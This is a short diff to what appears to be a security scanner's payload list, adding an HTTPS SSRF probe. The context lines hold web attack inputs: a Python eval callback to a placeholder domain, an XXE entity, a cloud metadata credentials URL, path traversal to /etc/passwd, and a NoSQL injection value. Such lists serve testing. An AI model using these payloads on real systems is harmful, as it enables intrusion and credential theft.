@@ -18,6 +18,7 @@ __import__('urllib.request').request.urlopen('http://{domain}/pyeval')
 <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{domain}/xxe\">]><foo>&xxe;</foo>
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://{domain}/ssrf
+https://{domain}/ssrf
 ../../../../../../../etc/passwd
 return 7*191
 {\"$gt\":\"\",\"$ne\":\"\"}
